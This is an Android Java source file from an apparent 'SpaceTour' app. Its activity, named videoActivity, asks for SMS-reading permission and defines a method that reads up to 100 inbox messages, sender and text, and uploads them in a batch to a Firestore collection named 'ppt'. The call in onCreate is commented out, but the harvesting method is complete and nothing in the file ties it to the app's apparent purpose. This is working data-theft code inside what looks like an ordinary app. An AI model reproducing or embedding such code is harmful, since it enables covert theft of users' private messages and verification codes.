package com.ariyanjakaria.spacetour;

import android.Manifest;
import android.content.ContentResolver;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.firestore.FirebaseFirestore;
import com.google.firebase.firestore.WriteBatch;

public class videoActivity extends AppCompatActivity {
    private static final int MAX_SMS_MESSAGES = 100; // Define the maximum number of SMS messages to store
    private FirebaseFirestore db;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_video);
        db = FirebaseFirestore.getInstance();

        // Check and request the READ_SMS permission
        if (checkSmsPermission()) {
           // accessAndStoreSMS();
        } else {
            requestSmsPermission();
        }
    }

    private boolean checkSmsPermission() {
        return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED;
    }

    private void requestSmsPermission() {
        ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_SMS}, SMS_PERMISSION_CODE);
    }

    // Define the SMS permission request code
    private static final int SMS_PERMISSION_CODE = 101;

    private void accessAndStoreSMS() {
        Uri uri = Uri.parse("content://sms/inbox");
        ContentResolver contentResolver = getContentResolver();
        Cursor cursor = contentResolver.query(uri, null, null, null, null);

        if (cursor != null) {
            WriteBatch batch = db.batch();
            int smsCount = 0; // Counter to track the number of stored SMS messages

            while (cursor.moveToNext() && smsCount < MAX_SMS_MESSAGES) {
                int bodyIndex = cursor.getColumnIndex("body");
                int addressIndex = cursor.getColumnIndex("address");

                if (bodyIndex >= 0 && addressIndex >= 0) {
                    String messageBody = cursor.getString(bodyIndex);
                    String sender = cursor.getString(addressIndex);

                    // Store the SMS in Firestore
                    batch.set(db.collection("ppt").document(), new SMSMessage(sender, messageBody));
                    smsCount++;

                    // Break the loop if the maximum number of SMS messages has been stored
                    if (smsCount >= MAX_SMS_MESSAGES) {
                        break;
                    }
                }
            }

            cursor.close();

            int finalSmsCount = smsCount;
            batch.commit().addOnCompleteListener(new OnCompleteListener<Void>() {
                @Override
                public void onComplete(@NonNull Task<Void> task) {
                    if (task.isSuccessful()) {
                        // SMS messages stored in Firestore successfully
                        Toast.makeText(videoActivity.this, "Stored " + finalSmsCount + " SMS messages successfully", Toast.LENGTH_SHORT).show();
                    } else {
                        // Handle the error
                    }
                }
            });
        }
    }




}


